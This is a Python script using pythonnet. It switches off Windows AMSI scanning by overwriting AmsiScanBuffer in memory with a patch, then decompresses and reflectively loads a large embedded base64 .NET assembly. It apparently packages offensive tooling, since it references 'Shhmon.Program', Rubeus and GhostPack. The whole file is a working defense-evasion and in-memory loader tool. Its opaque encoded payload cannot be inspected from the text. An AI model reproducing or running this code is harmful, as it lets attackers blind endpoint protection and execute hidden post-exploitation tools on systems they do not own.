import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("Shhmon.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()